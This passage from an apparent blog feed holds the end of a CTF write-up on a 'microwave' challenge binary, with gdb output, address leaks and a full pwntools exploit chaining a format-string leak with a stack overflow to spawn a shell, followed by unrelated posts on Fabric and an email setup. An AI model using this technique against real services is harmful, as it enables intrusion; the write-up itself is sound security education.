&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0000000000046553&lt;/span&gt; &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0000000000046556&lt;/span&gt; &lt;span class="nf"&gt;call&lt;/span&gt;    &lt;span class="no"&gt;execve&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So by overwriting saved-RIP with that address (libc base address + 0x4652C)
we get RCE (execve of "/bin/sh").&lt;/p&gt;
&lt;p&gt;One needs to leak two elements to be able to exploit:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the canary (to bypass canary protection)&lt;/li&gt;
&lt;li&gt;one address of the libc to retrieve the offset to the magic gadget above&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These are retrieved using the first vulnerability (string format) and then
the second vulnerability (buffer overflow) is used to overflow the stack
and overwrite the return address.&lt;/p&gt;
&lt;p&gt;The addresses leaked from the string format shows some
of them are in the libc (starting with 0x7fff...). We need to know how far from
the base address these are in order to
retrieve the base address. This base address is then used to refer to the
magic gadget.&lt;/p&gt;
&lt;p&gt;This is easily done with gdb:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gdb microwave_61f50dba931bb10ab3089215b2e188f4
gdb-peda$ &lt;span class="nb"&gt;set&lt;/span&gt; environment &lt;span class="nv"&gt;LD_PRELOAD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;./libc.so.6
gdb-peda$ r
Starting program: /tmp/microwave_61f50dba931bb10ab3089215b2e188f4

 --------------------------------------------------------
 &lt;span class="p"&gt;|&lt;/span&gt;     Welcome to the next generation of MicroWaves!    &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;                         ***                          &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt; This stylish Microwave with Grill &lt;span class="k"&gt;function&lt;/span&gt;, includes &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;      a &lt;span class="k"&gt;function&lt;/span&gt; that tweets your favourite food!     &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;                         ***                          &lt;span class="p"&gt;|&lt;/span&gt;
 --------------------------------------------------------
           ----------------------------------
           &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="m"&gt;1&lt;/span&gt;. Connect to Twitter account &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="m"&gt;2&lt;/span&gt;. Edit your tweet            &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="m"&gt;3&lt;/span&gt;. Grill &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; Tweet your food    &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  q. Exit                       &lt;span class="p"&gt;|&lt;/span&gt;
           ----------------------------------

           &lt;span class="o"&gt;[&lt;/span&gt;MicroWave&lt;span class="o"&gt;]&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt;

           Log in on Twitter:
           username: %p.%p.%p.%p.%p
           password: n07_7h3_fl46

Checking 0xa.0x7ffff7b02870.0x7ffff7ff3740.0x555555556ac0.&lt;span class="o"&gt;(&lt;/span&gt;nil&lt;span class="o"&gt;)&lt;/span&gt;
Twitter account
............
           ----------------------------------
           &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="m"&gt;1&lt;/span&gt;. Connect to Twitter account &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="m"&gt;2&lt;/span&gt;. Edit your tweet            &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="m"&gt;3&lt;/span&gt;. Grill &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; Tweet your food    &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  q. Exit                       &lt;span class="p"&gt;|&lt;/span&gt;
           ----------------------------------

           &lt;span class="o"&gt;[&lt;/span&gt;MicroWave&lt;span class="o"&gt;]&lt;/span&gt;: ^C
Program received signal SIGINT, Interrupt.
Stopped reason: SIGINT
0x00007ffff7b02810 in &lt;span class="nb"&gt;read&lt;/span&gt; &lt;span class="o"&gt;()&lt;/span&gt; from ./libc.so.6
gdb-peda$ vmmap
Start              End                Perm  Name
0x0000555555554000 0x0000555555557000 r-xp  /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
0x0000555555757000 0x0000555555758000 r--p  /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
0x0000555555758000 0x0000555555759000 rw-p  /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
0x0000555555759000 0x000055555577a000 rw-p  &lt;span class="o"&gt;[&lt;/span&gt;heap&lt;span class="o"&gt;]&lt;/span&gt;
0x00007ffff7a17000 0x00007ffff7bd2000 r-xp  /tmp/libc.so.6
0x00007ffff7bd2000 0x00007ffff7dd1000 ---p  /tmp/libc.so.6
0x00007ffff7dd1000 0x00007ffff7dd5000 r--p  /tmp/libc.so.6
0x00007ffff7dd5000 0x00007ffff7dd7000 rw-p  /tmp/libc.so.6
0x00007ffff7dd7000 0x00007ffff7ddc000 rw-p  mapped
0x00007ffff7ddc000 0x00007ffff7dfc000 r-xp  /lib/x86_64-linux-gnu/ld-2.19.so
0x00007ffff7ff2000 0x00007ffff7ff8000 rw-p  mapped
0x00007ffff7ff8000 0x00007ffff7ffa000 r-xp  &lt;span class="o"&gt;[&lt;/span&gt;vdso&lt;span class="o"&gt;]&lt;/span&gt;
0x00007ffff7ffa000 0x00007ffff7ffc000 r--p  &lt;span class="o"&gt;[&lt;/span&gt;vvar&lt;span class="o"&gt;]&lt;/span&gt;
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p  /lib/x86_64-linux-gnu/ld-2.19.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p  /lib/x86_64-linux-gnu/ld-2.19.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p  mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p  &lt;span class="o"&gt;[&lt;/span&gt;stack&lt;span class="o"&gt;]&lt;/span&gt;
0xffffffffff600000 0xffffffffff601000 r-xp  &lt;span class="o"&gt;[&lt;/span&gt;vsyscall&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The offset is thus &lt;code&gt;hex(0x7ffff7b02870 - 0x00007ffff7a17000) = 0xeb870&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now constructing the exploit using &lt;a href="https://github.com/Gallopsled/pwntools"&gt;pwntools&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Exploit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python2&lt;/span&gt;
&lt;span class="c1"&gt;# author: deadc0de6&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;

&lt;span class="n"&gt;PASSWORD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;n07_7h3_fl46&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;magic_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x4652c&lt;/span&gt;
&lt;span class="n"&gt;base_offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0xeb870&lt;/span&gt;

&lt;span class="c1"&gt;#p = remote(&amp;#39;microwave.insomni.hack&amp;#39;, 1337)&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;remote&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1337&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[MicroWave]: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# select (1) connect&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# send username&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;%p.&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# send password&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PASSWORD&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# read leaked addresses&lt;/span&gt;
&lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[MicroWave]: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;addrs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;addrs&lt;/span&gt;

&lt;span class="c1"&gt;# canary is the sixth element&lt;/span&gt;
&lt;span class="n"&gt;canary&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;addrs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# libc address is the second element&lt;/span&gt;
&lt;span class="n"&gt;libcaddr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;addrs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;libcaddr&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;base_offset&lt;/span&gt;

&lt;span class="c1"&gt;# print some information&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;canary is &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;canary&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;libc base: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;magic addr: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;magic_addr&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="c1"&gt;# select (2) send tweet&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#&amp;gt; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# construct the exploit&lt;/span&gt;
&lt;span class="n"&gt;buf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;1032&lt;/span&gt;
&lt;span class="n"&gt;buf&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;canary&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;buf&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;B&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="n"&gt;buf&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;magic_addr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# exploit&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;clean&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="c1"&gt;# interact with it&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;interactive&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It is then possible to &lt;code&gt;cat&lt;/code&gt; the flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./microwave-pwn.py
&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Opening connection to &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 on port &lt;span class="m"&gt;1337&lt;/span&gt;: Done

 --------------------------------------------------------
 &lt;span class="p"&gt;|&lt;/span&gt;     Welcome to the next generation of MicroWaves!    &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;                         ***                          &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt; This stylish Microwave with Grill &lt;span class="k"&gt;function&lt;/span&gt;, includes &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;      a &lt;span class="k"&gt;function&lt;/span&gt; that tweets your favourite food!     &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;                         ***                          &lt;span class="p"&gt;|&lt;/span&gt;
 --------------------------------------------------------
           ----------------------------------
           &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="m"&gt;1&lt;/span&gt;. Connect to Twitter account &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="m"&gt;2&lt;/span&gt;. Edit your tweet            &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="m"&gt;3&lt;/span&gt;. Grill &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; Tweet your food    &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  q. Exit                       &lt;span class="p"&gt;|&lt;/span&gt;
           ----------------------------------

           &lt;span class="o"&gt;[&lt;/span&gt;MicroWave&lt;span class="o"&gt;]&lt;/span&gt;:
&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;0xa&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;0x7f192241b870&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;0x7f1922b16740&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;0x7f192291aac0&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;(nil)&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;0x4cacfb0061420700&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;0x7f19226ef870&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;0x7f19226ef878&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
canary is 0x4cacfb0061420700
libc base: 0x7f1922330000
magic addr: 0x7f192237652c

           &lt;span class="c1"&gt;#&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Switching to interactive mode
$ ls
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To reproduce the execution locally, I used socat with the following tweak:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat doit.sh
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;
&lt;span class="nv"&gt;LD_PRELOAD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;./libc.so.6 ./microwave_61f50dba931bb10ab3089215b2e188f4
$ socat tcp-l:1337,reuseaddr,fork exec:./doit.sh
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Note&lt;/h3&gt;
&lt;p&gt;On some systems, using &lt;a href="http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html"&gt;LD_PRELOAD&lt;/a&gt; won't
work and thus &lt;a href="http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html"&gt;LD_LIBRARY_PATH&lt;/a&gt; with the
full path to the folder containing the provided libc (&lt;em&gt;libc.so.6&lt;/em&gt;) should be provided.&lt;/p&gt;
&lt;p&gt;It is indeed a better way of doing it since &lt;em&gt;LD_PRELOAD&lt;/em&gt; should be used when replacing only some specific functions
of a library and not a full library (in which case &lt;em&gt;LD_LIBRARY_PATH&lt;/em&gt; is to be used).&lt;/p&gt;
&lt;p&gt;Thanks to &lt;a href="https://twitter.com/dummys1337"&gt;Dummys1337&lt;/a&gt; for pointing that out !!&lt;/p&gt;</content><category term="ctf"></category><category term="exploit"></category><category term="write-up"></category><category term="rop"></category></entry><entry><title>Streamline sysadmin tasks with fabric</title><link href="https://deadc0de.re/articles/fabric.html" rel="alternate"></link><published>2016-03-13T00:00:00+01:00</published><updated>2016-03-13T00:00:00+01:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2016-03-13:/articles/fabric.html</id><summary type="html">&lt;p&gt;streamline sysadmin tasks with fabric&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;a href="http://www.fabfile.org/"&gt;Fabric&lt;/a&gt; is a Python command-line tool and library for
streamlining sysadmins tasks. It is very useful when you have multiple
hosts dedicated for a specific purpose (for example for an elasticsearch
cluster) and you want to administer them without the hassle of connecting to
each of them individually.&lt;/p&gt;
&lt;p&gt;It allows to quickly execute the same command/task on different hosts through
ssh. It's one way of doing it though, there are many other alternatives:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/sfermigier/tentakel"&gt;tentakel&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pkittenis/parallel-ssh"&gt;parallel-ssh&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/duncs/clusterssh/wiki"&gt;clusterssh&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.netfort.gr.jp/~dancer/software/dsh.html.en"&gt;dsh&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/rlewczuk/pssh"&gt;pssh&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;... and many more ...&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I like fabric because it gives you a lot of power thanks to Python. I haven't
yet tried &lt;em&gt;parallel-ssh&lt;/em&gt; which looks like a good alternative.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://gitlab.com/deadc0de6/scripts/blob/master/nodes-mgmt.py"&gt;Here&lt;/a&gt;'s a little
template I tend to complete depending on the job I have to do. It's a nice starting
point if one wants to try fabric&lt;/p&gt;
&lt;p&gt;Simply complete the &lt;em&gt;TODO&lt;/em&gt; and get going.&lt;/p&gt;
&lt;p&gt;An example of the run against 3 different hosts:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./nodes-mgmt.py top
&lt;span class="c1"&gt;##################################################################&lt;/span&gt;
task: &lt;span class="s2"&gt;&amp;quot;top&amp;quot;&lt;/span&gt;
&lt;span class="c1"&gt;##################################################################&lt;/span&gt;
------------ host &lt;span class="s2"&gt;&amp;quot;node1&amp;quot;&lt;/span&gt; -------------
top - &lt;span class="m"&gt;14&lt;/span&gt;:11:51 up &lt;span class="m"&gt;1&lt;/span&gt; day, &lt;span class="m"&gt;45&lt;/span&gt; min,  &lt;span class="m"&gt;1&lt;/span&gt; user,  load average: &lt;span class="m"&gt;0&lt;/span&gt;.98, &lt;span class="m"&gt;0&lt;/span&gt;.97, &lt;span class="m"&gt;1&lt;/span&gt;.01
------------ host &lt;span class="s2"&gt;&amp;quot;node0&amp;quot;&lt;/span&gt; -------------
top - &lt;span class="m"&gt;14&lt;/span&gt;:11:51 up &lt;span class="m"&gt;1&lt;/span&gt; day, &lt;span class="m"&gt;44&lt;/span&gt; min,  &lt;span class="m"&gt;1&lt;/span&gt; user,  load average: &lt;span class="m"&gt;1&lt;/span&gt;.64, &lt;span class="m"&gt;1&lt;/span&gt;.16, &lt;span class="m"&gt;1&lt;/span&gt;.10
------------ host &lt;span class="s2"&gt;&amp;quot;node2&amp;quot;&lt;/span&gt; -------------
top - &lt;span class="m"&gt;14&lt;/span&gt;:11:52 up &lt;span class="m"&gt;1&lt;/span&gt; day, &lt;span class="m"&gt;45&lt;/span&gt; min,  &lt;span class="m"&gt;1&lt;/span&gt; user,  load average: &lt;span class="m"&gt;0&lt;/span&gt;.96, &lt;span class="m"&gt;0&lt;/span&gt;.96, &lt;span class="m"&gt;1&lt;/span&gt;.02

Duration: &lt;span class="m"&gt;0&lt;/span&gt;:00:02
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Streamline everything !!&lt;/p&gt;</content><category term="fabric"></category><category term="python"></category><category term="sysadmin"></category></entry><entry><title>Email stack FTW</title><link href="https://deadc0de.re/articles/email-stack.html" rel="alternate"></link><published>2016-03-12T00:00:00+01:00</published><updated>2016-03-12T00:00:00+01:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2016-03-12:/articles/email-stack.html</id><summary type="html">&lt;p&gt;Email stack FTW (offlineimap,alot,notmuch,...)&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;em&gt;If you wake up looking forward to booting your shiny new Windows 10 with your
flashy outlook, well this is way too advanced for you, pass on.
One advice though: get a grown-up OS ;-)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Since I moved out of gmail (for obvious privacy reasons), I was using simultaneously
&lt;a href="http://www.mutt.org/"&gt;mutt&lt;/a&gt; and &lt;a href="https://roundcube.net/"&gt;roundcube&lt;/a&gt;
to access my emails.&lt;/p&gt;
&lt;p&gt;mutt is a really powerful tool to help you quickly get things done
(reading, writing, searching emails).
Roundcube on the other hand allowed me to access my emails from anywhere
without having to setup all the needed tools.&lt;/p&gt;
&lt;p&gt;Those tools were nice but I was missing some features.
I thus decided to move to something faster, more complete with specific features:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;TUI&lt;/strong&gt;:
    I hate using the mouse and want something fast with great keybindings
    preferably vim-like&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;fast search&lt;/strong&gt;:
    Ability to search in all my emails quickly (independently if the searched term
    is in the body or the header)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;tags&lt;/strong&gt;:
    Ability to tag my emails&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;webmail-compatible&lt;/strong&gt;:
    Retro-compatibility with webmail (roundcube or similar)
    such that I could still access my emails from another computer without having to
    setup all needed tools&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Auto-tag&lt;/strong&gt;:
    Ability to auto-tag my emails (specific mailing-list to a specific
    tag/folder, ...)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So in short I wanted to be able to read my emails from a TUI that
allows me to tag (auto-tag) my emails but also allows in some way to synchronize
the changes (tags, flags, ...) with the remote IMAP server. Such that I would
be able, if needed, to read my emails remotely and still be able to find my
